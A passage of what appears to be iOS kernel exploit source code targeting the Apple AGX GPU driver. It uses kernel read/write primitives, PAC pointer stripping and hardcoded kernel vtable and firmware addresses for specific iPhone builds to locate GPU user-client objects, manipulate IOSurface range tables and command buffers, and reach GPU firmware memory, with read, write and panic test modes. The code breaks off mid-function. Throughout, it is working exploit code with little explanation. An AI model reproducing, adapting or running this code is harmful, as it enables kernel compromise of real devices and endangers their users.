#import "agx.h"

#import <IOKit/IOKitLib.h>
#import <IOSurface/IOSurfaceRef.h>
#import <Metal/Metal.h>

#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "common.h"
#include "krw.h"

#define PAGE_SIZE_16K ((size_t)0x4000)
#define AGX_WRITE_VALUE ((uint8_t)0xa5)

#define IOMACHPORT_VTABLE UINT64_C(0xfffffff007befdc0)
#define AGX_USERCLIENT_VTABLE UINT64_C(0xfffffff007c47ca8)
#define AGX_ACCELERATOR_G17P_VTABLE UINT64_C(0xfffffff007c4ff50)
#define AGX_FIRMWARE_G17P_VTABLE UINT64_C(0xfffffff007c4be98)
#define IOGPU_MEMORY_VTABLE UINT64_C(0xfffffff007c46c78)
#define DEVICE_CONTROL_RING_VTABLE UINT64_C(0xfffffff007c491b0)
#define TASK_IPC_SPACE UINT64_C(0x318)
#define IPC_SPACE_TABLE UINT64_C(0x20)
#define IPC_ENTRY_SIZE UINT64_C(0x18)
#define IPC_PORT_KOBJECT UINT64_C(0x48)
#define PORT_LIMIT UINT64_C(65536)
#define SMR_BASE UINT64_C(2)
#define SMR_T1SZ_BOOT UINT64_C(17)

#define FIRMWARE_START UINT64_C(0xfffffc0000000000)
#define FIRMWARE_END UINT64_C(0xfffffc0000138418)
#define FIRMWARE_CONTROL_SOURCE (FIRMWARE_START + UINT64_C(0x400))
#define SCHEDULER_GLOBAL UINT64_C(0xfffffc0000132a98)
#define COPYOUT_TABLE UINT64_C(0xfffffc000004daa0)
#define COPYOUT_STRIDE UINT64_C(0xe0)
#define COPYOUT_RESULT UINT64_C(0x14)
#define COPYOUT_COMMAND UINT32_C(30)
#define COPYOUT_SENTINEL UINT32_C(0xdeadbeef)
#define COPYOUT_MIN_OFFSET UINT64_C(0x800)
#define COPYOUT_MAX_MAP_LENGTH UINT64_C(0x20000)
#define DEVICE_CONTROL_RING_OFFSET UINT64_C(0x9d8)
#define DEVICE_CONTROL_CHANNEL_OFFSET UINT64_C(0x1798)
#define DEVICE_CONTROL_ENDPOINT_OFFSET UINT64_C(0x120)
#define FIRMWARE_ASYNC_NOTE UINT64_C(0x83000000000011)
#define DROP_MARKER UINT32_C(0x41414141)
#define DROP_MARKER64 UINT64_C(0x4141414141414141)

#define CREATE_COMMAND_QUEUE UINT32_C(7)
#define CREATE_SHARED_MEMORY UINT32_C(13)
#define CREATE_NOTIFICATION_QUEUE UINT32_C(15)
#define SET_NOTIFICATION_QUEUE UINT32_C(25)
#define SUBMIT_COMMAND_BUFFERS UINT32_C(26)

_Static_assert(PAGE_SIZE_16K % EARLY_KRW_LENGTH == 0, "KRW chunk size must divide a 16 KiB page");

typedef struct {
    IOSurfaceRef surface;
    mach_port_t port;
    vm_address_t dummy_page;
    uint64_t ranges;
} mdsid_allocation_t;

typedef struct {
    uint32_t queue;
    uint64_t first_address;
    uint32_t first_id;
    uint64_t second_address;
    uint32_t second_id;
} command_buffers_t;

typedef struct {
    mach_port_t port;
    uint64_t ipc_table;
    uint64_t ipc_count;
    uint64_t device;
    uint64_t gpu;
    uint64_t state;
    uint64_t owner;
    uint64_t map_vtable;
    uint64_t target_gfx;
    uint64_t target_cpu;
    uint32_t buffer_offset;
} drop_context_t;

typedef struct {
    uint64_t firmware;
    uint64_t index_block;
    uint64_t ring_buffer;
    uint64_t inbox;
    uint32_t endpoint;
    uint64_t output_gpu_base;
    uint64_t output_cpu_base;
    uint64_t output_length;
    uint64_t output_entries[2];
    uint64_t main_gpu_base;
    uint64_t main_cpu_base;
    uint64_t main_length;
} read_context_t;

static uint64_t __attribute__((naked)) strip_pac(uint64_t pointer) {
    __asm(".long 0xDAC143E0");  // XPACI X0
    __asm("ret");
}

static bool kernel_object_pointer(uint64_t pointer) {
    return pointer >= UINT64_C(0xffffffdc00000000) &&
           pointer < UINT64_C(0xfffffff000000000) &&
           (pointer & 7) == 0;
}

static bool firmware_pointer(uint64_t pointer) {
    return pointer >= FIRMWARE_START && pointer < FIRMWARE_END;
}

static bool read_kernel(uint64_t address, void* output, size_t size) {
    if (!output || size == 0 || address > UINT64_MAX - size) return false;
    memset(output, 0, size);
    for (size_t offset = 0; offset < size; offset += EARLY_KRW_LENGTH) {
        size_t chunk = size - offset;
        if (chunk > EARLY_KRW_LENGTH) chunk = EARLY_KRW_LENGTH;
        if (!early_kread_checked(address + offset, (uint8_t*)output + offset, chunk)) return false;
    }
    return true;
}

static bool read16(uint64_t address, uint16_t* value) {
    return value && read_kernel(address, value, sizeof(*value));
}

static bool read8(uint64_t address, uint8_t* value) {
    return value && read_kernel(address, value, sizeof(*value));
}

static bool read32(uint64_t address, uint32_t* value) {
    return value && read_kernel(address, value, sizeof(*value));
}

static bool read64(uint64_t address, uint64_t* value) {
    return value && early_kread64_checked(address, value);
}

static bool read_pointer(uint64_t address, uint64_t* pointer) {
    uint64_t raw = 0;
    if (!pointer || !read64(address, &raw)) return false;
    *pointer = strip_pac(raw);
    return kernel_object_pointer(*pointer);
}

static bool write16(uint64_t address, uint16_t value) {
    uint16_t observed = 0;
    return early_kwrite16_checked(address, value) && read16(address, &observed) && observed == value;
}

static bool write_kernel(uint64_t address, const void* input, size_t size) {
    if (!input || size == 0 || address > UINT64_MAX - size) return false;
    for (size_t offset = 0; offset < size; offset += EARLY_KRW_LENGTH) {
        size_t chunk = size - offset;
        if (chunk > EARLY_KRW_LENGTH) chunk = EARLY_KRW_LENGTH;
        if (!early_kwrite_checked(address + offset, (const uint8_t*)input + offset, chunk)) return false;
    }
    uint8_t check[EARLY_KRW_LENGTH];
    for (size_t offset = 0; offset < size; offset += sizeof(check)) {
        size_t chunk = size - offset;
        if (chunk > sizeof(check)) chunk = sizeof(check);
        if (!read_kernel(address + offset, check, chunk) ||
            memcmp(check, (const uint8_t*)input + offset, chunk) != 0) return false;
    }
    return true;
}

static bool write8(uint64_t address, uint8_t value) {
    return write_kernel(address, &value, sizeof(value));
}

static bool write32(uint64_t address, uint32_t value) {
    uint32_t observed = 0;
    return early_kwrite32_checked(address, value) && read32(address, &observed) && observed == value;
}

static bool write64(uint64_t address, uint64_t value) {
    uint64_t observed = 0;
    return early_kwrite64_checked(address, value) && read64(address, &observed) && observed == value;
}

bool agx_test_mode_from_argument(const char* argument, agx_test_mode_t* mode) {
    if (!argument || !mode) return false;
    if (strcmp(argument, "--acquire-only") == 0) {
        *mode = AGX_TEST_ACQUIRE_ONLY;
        return true;
    }
    if (strcmp(argument, "--gfx-read-control") == 0) {
        *mode = AGX_TEST_READ_CONTROL;
        return true;
    }
    if (strcmp(argument, "--gfx-read") == 0) {
        *mode = AGX_TEST_READ;
        return true;
    }
    if (strcmp(argument, "--gfx-write-control") == 0) {
        *mode = AGX_TEST_WRITE_CONTROL;
        return true;
    }
    if (strcmp(argument, "--gfx-write-panic") == 0) {
        *mode = AGX_TEST_WRITE_PANIC;
        return true;
    }
    return false;
}

const char* agx_test_mode_name(agx_test_mode_t mode) {
    switch (mode) {
        case AGX_TEST_SHADOW: return "shadow";
        case AGX_TEST_ACQUIRE_ONLY: return "acquire-only";
        case AGX_TEST_READ_CONTROL: return "gfx-read-control";
        case AGX_TEST_READ: return "gfx-read";
        case AGX_TEST_WRITE_CONTROL: return "gfx-write-control";
        case AGX_TEST_WRITE_PANIC: return "gfx-write-panic";
    }
    return "unknown";
}

bool agx_test_argument_valid(agx_test_mode_t mode, uint64_t argument) {
    switch (mode) {
        case AGX_TEST_READ:
            return argument >= FIRMWARE_START + 0x10 &&
                argument <= FIRMWARE_END - 0x50 && (argument & 7) == 0;
        case AGX_TEST_SHADOW:
        case AGX_TEST_ACQUIRE_ONLY:
        case AGX_TEST_READ_CONTROL:
        case AGX_TEST_WRITE_CONTROL:
        case AGX_TEST_WRITE_PANIC:
            return true;
    }
    return false;
}

static bool buffer_is_filled(const uint8_t* buffer, size_t length, uint8_t value) {
    for (size_t index = 0; index < length; index++) {
        if (buffer[index] != value) return false;
    }
    return true;
}

static bool verify_agx_buffer_rw(const uint8_t* input, size_t length) {
    id<MTLDevice> device = MTLCreateSystemDefaultDevice();
    if (!device) {
        LOG_ERR("Metal device unavailable");
        return false;
    }

    id<MTLCommandQueue> queue = [device newCommandQueue];
    id<MTLBuffer> source = [device newBufferWithBytes:input length:length options:MTLResourceStorageModeShared];
    id<MTLBuffer> copy = [device newBufferWithLength:length options:MTLResourceStorageModeShared];
    id<MTLBuffer> write = [device newBufferWithLength:length options:MTLResourceStorageModeShared];
    if (!queue || !source || !copy || !write || !copy.contents || !write.contents) {
        LOG_ERR("Metal shared-buffer allocation failed");
        return false;
    }

    for (size_t index = 0; index < length; index++) {
        ((uint8_t*)copy.contents)[index] = input[index] ^ 0xff;
    }
    memset(write.contents, (uint8_t)~AGX_WRITE_VALUE, length);

    id<MTLCommandBuffer> command = [queue commandBuffer];
    id<MTLBlitCommandEncoder> blit = [command blitCommandEncoder];
    if (!command || !blit) {
        LOG_ERR("Metal blit setup failed");
        return false;
    }

    [blit copyFromBuffer:source sourceOffset:0 toBuffer:copy destinationOffset:0 size:length];
    [blit fillBuffer:write range:NSMakeRange(0, length) value:AGX_WRITE_VALUE];
    [blit endEncoding];
    [command commit];
    [command waitUntilCompleted];
    if (command.status != MTLCommandBufferStatusCompleted) {
        const char* error = command.error.localizedDescription.UTF8String;
        LOG_ERR("Metal command failed (status=%ld, error=%s)", (long)command.status, error ?: "none");
        return false;
    }

    return memcmp(input, copy.contents, length) == 0 && buffer_is_filled(write.contents, length, AGX_WRITE_VALUE);
}

static bool read_root_page(uint64_t tte, uint8_t* page) {
    for (size_t offset = 0; offset < PAGE_SIZE_16K; offset += EARLY_KRW_LENGTH) {
        if (!early_kread_checked(tte + offset, page + offset, EARLY_KRW_LENGTH)) {
            LOG_ERR("root-table read failed at +%#zx", offset);
            return false;
        }
    }
    return true;
}

static bool capture_stable_root(uint64_t tte, uint8_t* snapshot) {
    uint8_t* check = malloc(PAGE_SIZE_16K);
    if (!check) return false;

    bool captured = read_root_page(tte, snapshot) && read_root_page(tte, check);
    bool stable = captured && memcmp(snapshot, check, PAGE_SIZE_16K) == 0;
    free(check);
    if (captured && !stable) LOG_ERR("root table changed during capture");
    return stable;
}

bool agx_buffer_rw_self_test(void) {
    @autoreleasepool {
        uint8_t* pattern = malloc(PAGE_SIZE_16K);
        if (!pattern) return false;
        for (size_t index = 0; index < PAGE_SIZE_16K; index++) {
            pattern[index] = (uint8_t)((index * 131u) ^ (index >> 3) ^ 0x5a);
        }

        bool passed = verify_agx_buffer_rw(pattern, PAGE_SIZE_16K);
        free(pattern);
        LOG("AGX shared-buffer read/write self-test=%s bytes=%#zx", passed ? "verified" : "failed", PAGE_SIZE_16K);
        return passed;
    }
}

bool agx_shadow_test(uint64_t self_pmap) {
    @autoreleasepool {
        if (!krw_is_kernel_address(self_pmap)) {
            LOG_ERR("invalid pmap address");
            return false;
        }

        uint64_t tte = 0;
        uint64_t ttep = 0;
        if (!early_kread64_checked(self_pmap, &tte) ||
            !early_kread64_checked(self_pmap + 8, &ttep) ||
            !krw_is_kernel_address(tte) ||
            ttep == 0 ||
            (ttep & (PAGE_SIZE_16K - 1)) != 0) {
            LOG_ERR("pmap TTE/TTEP read failed");
            return false;
        }

        uint8_t* snapshot = malloc(PAGE_SIZE_16K);
        if (!snapshot) return false;
        bool passed = capture_stable_root(tte, snapshot) &&
                      !buffer_is_filled(snapshot, PAGE_SIZE_16K, 0) &&
                      verify_agx_buffer_rw(snapshot, PAGE_SIZE_16K);
        free(snapshot);

        LOG("pmap tte=%#llx ttep=%#llx", tte, ttep);
        LOG("AGX root snapshot copy=%s bytes=%#zx", passed ? "verified" : "failed", PAGE_SIZE_16K);
        return passed;
    }
}

static uint64_t decode_smr_pointer(uint64_t raw) {
    // iPhone17,1-4 / 22G100 values used by the proven SRD kmem_read_smrptr path.
    uint64_t pointer = raw <= UINT64_C(0xfffffeffffffffff) ? strip_pac(raw) : raw;
    uint64_t base = SMR_BASE << (62 - SMR_T1SZ_BOOT);
    return (pointer & base) == 0 ? (pointer & ~UINT64_C(0x3fff)) | base
                                 : pointer & ~UINT64_C(0x1f);
}

static bool decode_ipc_table(uint64_t raw, uint64_t expected_base,
                             uint64_t* base, uint64_t* count) {
    uint64_t stripped = strip_pac(raw);
    bool zone_encoded = (stripped & ~UINT64_C(0x1f)) == expected_base;
    bool vm_encoded = !zone_encoded && (expected_base & UINT64_C(0x3fff)) == 0;
    uint64_t size = 0;
    if (zone_encoded) {
        uint64_t exponent = raw & 0xf;
        uint64_t mantissa = 32 + (raw & 0x10);
        if (exponent >= 63 || mantissa > (UINT64_MAX >> exponent)) return false;
        size = mantissa << exponent;
    } else if (vm_encoded) {
        uint64_t pages = raw & 0x3fff;
        if (pages == 0 || pages > (UINT64_MAX >> 14)) return false;
        size = pages << 14;
    } else {
        return false;
    }

    uint64_t entries = size / IPC_ENTRY_SIZE;
    if (!kernel_object_pointer(expected_base) ||
        (expected_base & UINT64_C(0x1f)) != 0 ||
        entries < 2 || entries > PORT_LIMIT) return false;
    *base = expected_base;
    *count = entries;
    return true;
}

static bool current_ipc_table(uint64_t* base, uint64_t* count) {
    uint64_t space_raw = 0;
    uint64_t space = 0;
    uint64_t table_raw = 0;
    bool task_valid = kernel_object_pointer(g_ctx.self_task);
    bool space_read = task_valid && read64(g_ctx.self_task + TASK_IPC_SPACE, &space_raw);
    space = strip_pac(space_raw);
    bool space_valid = space_read && kernel_object_pointer(space);
    bool table_read = space_valid && read64(space + IPC_SPACE_TABLE, &table_raw);
    uint64_t table_smr = table_read ? decode_smr_pointer(table_raw) : 0;
    bool decoded = table_read && decode_ipc_table(table_raw, table_smr, base, count);
    if (!decoded) {
        LOG_ERR("IPC table decode task=%#llx space_raw=%#llx space=%#llx table_raw=%#llx stripped=%#llx smr=%#llx task_ok=%u space_read=%u space_ok=%u table_read=%u",
            g_ctx.self_task, space_raw, space, table_raw, strip_pac(table_raw), table_smr,
            task_valid, space_read, space_valid, table_read);
    }
    return decoded;
}

static uint64_t port_kobject(uint64_t table, uint64_t count, mach_port_t name) {
    uint64_t index = (uint64_t)name >> 8;
    uint64_t port = 0;
    uint64_t object = 0;
    if (index >= count || !read_pointer(table + index * IPC_ENTRY_SIZE, &port) ||
        !read_pointer(port + IPC_PORT_KOBJECT, &object)) {
        return 0;
    }
    return object;
}

static uint64_t find_user_client(mach_port_t* port_out, uint64_t* table_out, uint64_t* count_out) {
    mach_port_name_array_t names = NULL;
    mach_port_type_array_t types = NULL;
    mach_msg_type_number_t name_count = 0;
    mach_msg_type_number_t type_count = 0;
    if (mach_port_names(mach_task_self(), &names, &name_count, &types, &type_count) != KERN_SUCCESS) return 0;

    uint64_t table = 0;
    uint64_t count = 0;
    uint64_t found = 0;
    mach_port_t found_port = MACH_PORT_NULL;
    if (!current_ipc_table(&table, &count)) {
        LOG_ERR("AGX user-client scan could not decode IPC table task=%#llx", g_ctx.self_task);
        goto done;
    }

    mach_msg_type_number_t limit = name_count < type_count ? name_count : type_count;
    unsigned objects = 0;
    unsigned wrappers = 0;
    for (mach_msg_type_number_t index = 0; index < limit; index++) {
        if ((types[index] & MACH_PORT_TYPE_SEND) == 0) continue;
        uint64_t object = port_kobject(table, count, names[index]);
        uint64_t vtable_raw = 0;
        if (!kernel_object_pointer(object) || !read64(object, &vtable_raw)) continue;
        objects++;
        uint64_t vtable = strip_pac(vtable_raw);
        if (vtable == AGX_USERCLIENT_VTABLE + g_ctx.kernel_slide) {
            found = object;
            found_port = names[index];
            break;
        }
        if (vtable != IOMACHPORT_VTABLE + g_ctx.kernel_slide) continue;
        wrappers++;

        uint64_t child = 0;
        uint64_t child_vtable_raw = 0;
        if (read_pointer(object + 0x30, &child) && read64(child, &child_vtable_raw) &&
            strip_pac(child_vtable_raw) == AGX_USERCLIENT_VTABLE + g_ctx.kernel_slide) {
            found = child;
            found_port = names[index];
            break;
        }
    }
    LOG("AGX user-client scan names=%u table=%#llx count=%llu objects=%u wrappers=%u found=%#llx port=%#x expected=%#llx",
        limit, table, count, objects, wrappers, found, found_port,
        AGX_USERCLIENT_VTABLE + g_ctx.kernel_slide);

done:
    if (names) vm_deallocate(mach_task_self(), (vm_address_t)names, name_count * sizeof(*names));
    if (types) vm_deallocate(mach_task_self(), (vm_address_t)types, type_count * sizeof(*types));
    if (port_out) *port_out = found_port;
    if (table_out) *table_out = table;
    if (count_out) *count_out = count;
    return found;
}

static void free_mdsid_allocation(mdsid_allocation_t* allocation) {
    if (MACH_PORT_VALID(allocation->port)) mach_port_deallocate(mach_task_self(), allocation->port);
    if (allocation->surface) CFRelease(allocation->surface);
    if (allocation->dummy_page) vm_deallocate(mach_task_self(), allocation->dummy_page, PAGE_SIZE_16K);
    memset(allocation, 0, sizeof(*allocation));
}

static bool allocate_mdsid_table(uint64_t table, uint64_t count, mdsid_allocation_t* allocation) {
    memset(allocation, 0, sizeof(*allocation));
    if (vm_allocate(mach_task_self(), &allocation->dummy_page, PAGE_SIZE_16K, VM_FLAGS_ANYWHERE) != KERN_SUCCESS) return false;

    uint64_t* pairs = calloc(1, PAGE_SIZE_16K);
    if (!pairs) goto failure;
    for (size_t offset = 0; offset < PAGE_SIZE_16K; offset += 16) {
        pairs[offset / 8] = allocation->dummy_page;
        pairs[offset / 8 + 1] = PAGE_SIZE_16K;
    }

    CFDataRef data = CFDataCreate(kCFAllocatorDefault, (const UInt8*)pairs, PAGE_SIZE_16K);
    int64_t allocation_size = PAGE_SIZE_16K;
    CFNumberRef size_number = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &allocation_size);
    CFMutableDictionaryRef properties = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    free(pairs);
    pairs = NULL;
    if (data == NULL || size_number == NULL || properties == NULL) {
        if (data != NULL) CFRelease(data);
        if (size_number != NULL) CFRelease(size_number);
        if (properties != NULL) CFRelease(properties);
        goto failure;
    }
    CFDictionarySetValue(properties, CFSTR("IOSurfaceAllocSize"), size_number);
    CFDictionarySetValue(properties, CFSTR("IOSurfaceAddressRanges"), data);
    allocation->surface = IOSurfaceCreate(properties);
    CFRelease(properties);
    CFRelease(size_number);
    CFRelease(data);
    if (!allocation->surface) goto failure;

    allocation->port = IOSurfaceCreateMachPort(allocation->surface);
    uint64_t current_table = table;
    uint64_t current_count = count;
    if (!current_ipc_table(&current_table, &current_count)) goto failure;
    uint64_t wrapper = port_kobject(current_table, current_count, allocation->port);
    uint64_t wrapper_vtable_raw = 0;
    uint64_t send_right = 0;
    uint64_t surface = 0;
    uint64_t descriptor = 0;
    if (!MACH_PORT_VALID(allocation->port) || !kernel_object_pointer(wrapper) ||
        !read64(wrapper, &wrapper_vtable_raw) ||
        strip_pac(wrapper_vtable_raw) != IOMACHPORT_VTABLE + g_ctx.kernel_slide ||
        !read_pointer(wrapper + 0x30, &send_right) ||
        !read_pointer(send_right + 0x18, &surface) ||
        !read_pointer(surface + 0x30, &descriptor) ||
        !read_pointer(descriptor + 0x60, &allocation->ranges)) {
        goto failure;
    }

    uint64_t first_address = 0;
    uint64_t first_size = 0;
    uint64_t last_address = 0;
    uint64_t last_size = 0;
    uint64_t last = allocation->ranges + PAGE_SIZE_16K - 16;
    if (!read64(allocation->ranges, &first_address) ||
        !read64(allocation->ranges + 8, &first_size) ||
        !read64(last, &last_address) || !read64(last + 8, &last_size) ||
        first_address != allocation->dummy_page || first_size != PAGE_SIZE_16K ||
        last_address != allocation->dummy_page || last_size != PAGE_SIZE_16K) {
        goto failure;
    }
    LOG("MDSID range table=%#llx dummy=%#llx", allocation->ranges, (uint64_t)allocation->dummy_page);
    return true;

failure:
    free(pairs);
    free_mdsid_allocation(allocation);
    return false;
}

static kern_return_t submit(mach_port_t port, const command_buffers_t* buffers) {
    uint64_t scalar[4] = {buffers->queue, 0, 1, 56};
    uint8_t argument[56] = {};
    memcpy(argument, &buffers->first_id, sizeof(buffers->first_id));
    memcpy(argument + 4, &buffers->second_id, sizeof(buffers->second_id));
    return IOConnectCallMethod(port, SUBMIT_COMMAND_BUFFERS, scalar, 4, argument, sizeof(argument), NULL, NULL, NULL, NULL);
}

static bool setup_command_buffers(mach_port_t port, command_buffers_t* buffers) {
    memset(buffers, 0, sizeof(*buffers));
    uint8_t queue_input[0x408] = {};
    struct {
        uint32_t id;
        uint32_t padding;
        uint64_t counter;
    } queue = {};
    size_t queue_size = sizeof(queue);
    kern_return_t queue_kr = IOConnectCallStructMethod(port, CREATE_COMMAND_QUEUE, queue_input,
        sizeof(queue_input), &queue, &queue_size);

    uint64_t notification_input[2] = {256, 32};
    struct {
        uint64_t address;
        uint32_t id;
        uint32_t padding;
    } notification = {};
    size_t notification_size = sizeof(notification);
    kern_return_t notification_kr = IOConnectCallMethod(port, CREATE_NOTIFICATION_QUEUE,
        notification_input, 2, NULL, 0, NULL, NULL, &notification, &notification_size);

    uint64_t set_input[2] = {queue.id, notification.id};
    kern_return_t set_kr = KERN_FAILURE;
    if (queue_kr == KERN_SUCCESS && notification_kr == KERN_SUCCESS) {
        set_kr = IOConnectCallScalarMethod(port, SET_NOTIFICATION_QUEUE, set_input, 2, NULL, NULL);
    }

    struct {
        uint64_t address;
        uint32_t size;
        uint32_t id;
    } shared[2] = {};
    kern_return_t shared_kr[2] = {KERN_FAILURE, KERN_FAILURE};
    uint64_t shared_input[2] = {PAGE_SIZE_16K, 0};
    if (set_kr == KERN_SUCCESS) {
        for (unsigned index = 0; index < 2; index++) {
            size_t output_size = sizeof(shared[index]);
            shared_kr[index] = IOConnectCallMethod(port, CREATE_SHARED_MEMORY, shared_input, 2,
                NULL, 0, NULL, NULL, &shared[index], &output_size);
        }
    }

    bool ready = queue_kr == KERN_SUCCESS && notification_kr == KERN_SUCCESS &&
        set_kr == KERN_SUCCESS && shared_kr[0] == KERN_SUCCESS && shared_kr[1] == KERN_SUCCESS &&
        shared[0].address && shared[1].address && shared[0].size >= PAGE_SIZE_16K && shared[1].size >= PAGE_SIZE_16K;
    if (!ready) {
        LOG_ERR("AGX command setup failed queue=%#x note=%#x set=%#x shared=%#x/%#x",
            queue_kr, notification_kr, set_kr, shared_kr[0], shared_kr[1]);
        return false;
    }

    buffers->queue = queue.id;
    buffers->first_address = shared[0].address;
    buffers->first_id = shared[0].id;
    buffers->second_address = shared[1].address;
    buffers->second_id = shared[1].id;
    uint32_t* first = (uint32_t*)(uintptr_t)buffers->first_address;
    uint32_t* second = (uint32_t*)(uintptr_t)buffers->second_address;
    memset(first, 0, 0x40);
    memset(second, 0, 0x40);
    first[0] = 0x10002;
    first[1] = 0x10;
    second[2] = 1;
    second[3] = 0x40000001;
    second[5] = 0x10;
    __sync_synchronize();

    kern_return_t warmup_a = submit(port, buffers);
    kern_return_t warmup_b = submit(port, buffers);
    LOG("AGX command queue=%u warmup=%#x/%#x", queue.id, warmup_a, warmup_b);
    return warmup_a == KERN_SUCCESS && warmup_b == KERN_SUCCESS;
}

static bool wait_for32(uint64_t address, uint32_t expected, uint32_t* observed_out) {
    uint32_t observed = 0;
    for (unsigned attempt = 0; attempt < 500; attempt++) {
        if (read32(address, &observed) && observed == expected) {
            if (observed_out) *observed_out = observed;
            return true;
        }
        usleep(1000);
    }
    if (observed_out) *observed_out = observed;
    return false;
}

static bool resolve_drop_context(drop_context_t* context) {
    memset(context, 0, sizeof(*context));
    uint64_t user_client = find_user_client(&context->port, &context->ipc_table, &context->ipc_count);
    uint64_t gpu_vtable_raw = 0;
    uint64_t owner_vtable_raw = 0;
    uint64_t map = 0;
    uint64_t map_vtable_raw = 0;
    uint64_t owner_base = 0;
    uint64_t owner_size = 0;
    uint64_t owner_capacity = 0;
    uint64_t sysmem = 0;
    uint64_t accessor = 0;
    uint64_t cpu_base = 0;
    uint32_t dsids = 0;
    const char* stage = "user-client";
    if (!kernel_object_pointer(user_client) || !MACH_PORT_VALID(context->port)) goto object_failure;
    stage = "device";
    if (!read_pointer(user_client + 0x120, &context->device)) goto object_failure;
    stage = "accelerator";
    if (!read_pointer(context->device + 0x48, &context->gpu)) goto object_failure;
    stage = "accelerator-vtable";
    if (!read64(context->gpu, &gpu_vtable_raw) ||
        strip_pac(gpu_vtable_raw) != AGX_ACCELERATOR_G17P_VTABLE + g_ctx.kernel_slide) goto object_failure;
    stage = "dsids";
    if (!read32(context->gpu + 0xf49c, &dsids) || dsids != 96) goto object_failure;
    stage = "drop-state";
    if (!read_pointer(context->gpu + 0x120b8, &context->state)) goto object_failure;
    stage = "buffer-offset";
    if (!read32(context->state + 0x540, &context->buffer_offset) || context->buffer_offset != 0x200) goto object_failure;
    stage = "owner";
    if (!read_pointer(context->state + 0x18a88, &context->owner)) goto object_failure;
    stage = "map";
    if (!read_pointer(context->state + 0x548, &map)) goto object_failure;
    stage = "object-vtables";
    if (!read64(context->owner, &owner_vtable_raw) || !read64(map, &map_vtable_raw)) goto object_failure;
    stage = "owner-base";
    if (!read64(context->owner + 0x28, &owner_base) ||
        (owner_base & UINT64_C(0xffffff0000000000)) != UINT64_C(0xfffffc0000000000)) goto object_failure;
    stage = "owner-size";
    if (!read64(context->owner + 0x48, &owner_size) || !read64(context->owner + 0x50, &owner_capacity) ||
        owner_size != PAGE_SIZE_16K || owner_capacity != PAGE_SIZE_16K) goto object_failure;
    stage = "sysmem";
    if (!read_pointer(context->owner + 0x18, &sysmem)) goto object_failure;
    stage = "accessor";
    if (!read_pointer(sysmem + 0x80, &accessor)) goto object_failure;
    stage = "cpu-alias";
    if (!read64(accessor + 0xb8, &cpu_base) || !kernel_object_pointer(cpu_base) ||
        (cpu_base & (PAGE_SIZE_16K - 1)) != 0) goto object_failure;
    goto object_ready;

object_failure:
    LOG_ERR("DropMDSID object gate failed at %s uc=%#llx port=%#x device=%#llx gpu=%#llx vt=%#llx dsids=%u state=%#llx off=%#x owner=%#llx map=%#llx base=%#llx size=%#llx/%#llx sysmem=%#llx accessor=%#llx cpu=%#llx",
        stage, user_client, context->port, context->device, context->gpu, strip_pac(gpu_vtable_raw), dsids,
        context->state, context->buffer_offset, context->owner, map, owner_base, owner_size, owner_capacity,
        sysmem, accessor, cpu_base);
    return false;

object_ready:;

    uint64_t owner_method_raw = 0;
    uint64_t map_method_raw = 0;
    uint8_t owner_method[12] = {};
    uint8_t map_method[12] = {};
    static const uint8_t expected_owner_method[12] = {
        0x5f, 0x24, 0x03, 0xd5, 0x00, 0x14, 0x40, 0xf9, 0xc0, 0x03, 0x5f, 0xd6,
    };
    static const uint8_t expected_map_method[12] = {
        0x5f, 0x24, 0x03, 0xd5, 0xe0, 0x03, 0x01, 0xaa, 0xc0, 0x03, 0x5f, 0xd6,
    };
    uint64_t owner_vtable = strip_pac(owner_vtable_raw);
    uint64_t map_vtable = strip_pac(map_vtable_raw);
    if (!read64(owner_vtable + 0x98, &owner_method_raw) ||
        !read64(map_vtable + 0x220, &map_method_raw) ||
        !read_kernel(strip_pac(owner_method_raw), owner_method, sizeof(owner_method)) ||
        !read_kernel(strip_pac(map_method_raw), map_method, sizeof(map_method)) ||
        memcmp(owner_method, expected_owner_method, sizeof(owner_method)) != 0 ||
        memcmp(map_method, expected_map_method, sizeof(map_method)) != 0) {
        LOG_ERR("DropMDSID method-byte gate failed");
        return false;
    }

    context->target_gfx = owner_base + context->buffer_offset;
    context->target_cpu = cpu_base + context->buffer_offset;
    context->map_vtable = map_vtable;
    LOG("DropMDSID context port=%#x device=%#llx gpu=%#llx owner=%#llx", context->port,
        context->device, context->gpu, context->owner);
    LOG("DropMDSID scratch gfx=%#llx cpu=%#llx", context->target_gfx, context->target_cpu);
    return true;
}

static bool all_zero(const uint8_t* bytes, size_t size) {
    for (size_t index = 0; index < size; index++) {
        if (bytes[index] != 0) return false;
    }
    return true;
}

static bool resolve_firmware_map(const drop_context_t* drop, uint64_t firmware, uint64_t field_offset,
    uint64_t* gpu_base, uint64_t* cpu_base, uint64_t* length) {
    uint64_t sysmem = 0;
    uint64_t sysmem_vtable_raw = 0;
    uint64_t owner = 0;
    uint64_t map = 0;
    uint64_t map_vtable_raw = 0;
    uint64_t accessor = 0;
    uint64_t capacity = 0;
    return read_pointer(firmware + field_offset, &sysmem) &&
        read64(sysmem, &sysmem_vtable_raw) &&
        strip_pac(sysmem_vtable_raw) == IOGPU_MEMORY_VTABLE + g_ctx.kernel_slide &&
        read_pointer(sysmem + 0x10, &owner) && owner == drop->gpu &&
        read_pointer(sysmem + 0x58, &map) && read64(map, &map_vtable_raw) &&
        strip_pac(map_vtable_raw) == drop->map_vtable &&
        read_pointer(sysmem + 0x80, &accessor) &&
        read64(map + 0x28, gpu_base) && read64(accessor + 0xb8, cpu_base) &&
        read64(accessor + 0xc0, length) && read64(accessor + 0xc8, &capacity) &&
        kernel_object_pointer(*cpu_base) && (*cpu_base & (PAGE_SIZE_16K - 1)) == 0 &&
        *length >= PAGE_SIZE_16K && *length <= 0x400000 && capacity == *length;
}

static bool find_copyout_output(const drop_context_t* drop, read_context_t* context) {
    static const uint64_t map_fields[] = {0x508, 0x2c8, 0x4f8};
    uint8_t first[2 * COPYOUT_STRIDE];
    uint8_t second[sizeof(first)];
    for (size_t field_index = 0; field_index < sizeof(map_fields) / sizeof(map_fields[0]); field_index++) {
        uint64_t gpu_base = 0;
        uint64_t cpu_base = 0;
        uint64_t length = 0;
        if (!resolve_firmware_map(drop, context->firmware, map_fields[field_index],
            &gpu_base, &cpu_base, &length)) {
            continue;
        }

        if (length < COPYOUT_MIN_OFFSET + sizeof(first) ||
            length > COPYOUT_MAX_MAP_LENGTH || gpu_base > UINT64_MAX - length) continue;
        uint64_t end = gpu_base + length;
